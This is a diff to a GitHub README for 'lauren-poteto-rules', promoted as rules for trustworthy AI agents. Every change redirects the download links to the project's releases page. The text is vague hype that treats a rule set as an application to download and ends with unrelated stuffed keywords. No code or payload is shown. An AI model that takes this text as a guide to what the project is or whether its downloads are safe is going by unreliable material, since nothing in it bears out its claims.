@@ -1,6 +1,6 @@
 # 🤖 lauren-poteto-rules - Build Trustworthy AI Agent Workflows Today
 
-[![Download Now](https://img.shields.io/badge/Download-lauren--poteto--rules-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules)
+[![Download Now](https://img.shields.io/badge/Download-lauren--poteto--rules-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules/releases)
 
 ## 👋 Welcome to lauren-poteto-rules
 
@@ -41,7 +41,7 @@ Ready to dive in? Here's how to get started:
 
 ### Step 1: Download the Application
 
-Visit this link to download the application: **[https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules)**
+Visit this link to download the application: **[https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules/releases](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules/releases)**
 
 This link will take you to the main project page where you can find all the files you need.
 
@@ -153,6 +153,6 @@ These rules prioritize safety and transparency. They're designed to help you bui
 
 Building trustworthy coding agents doesn't have to be complicated. With lauren-poteto-rules, you have everything you need to create AI helpers that are reliable, safe, and genuinely useful. Start today and see the difference these rules make in your development workflow!
 
-**Remember**: The download link is **[https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules)** – visit it now to get started on your AI agent journey!
+**Remember**: The download link is **[https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules/releases](https://github.com/NPCGamingYT-TheGoat/lauren-poteto-rules/releases)** – visit it now to get started on your AI agent journey!
 
 Keywords: agent-skills, ai-agents, grok, grokbot, lauren-ten, spacex, xai
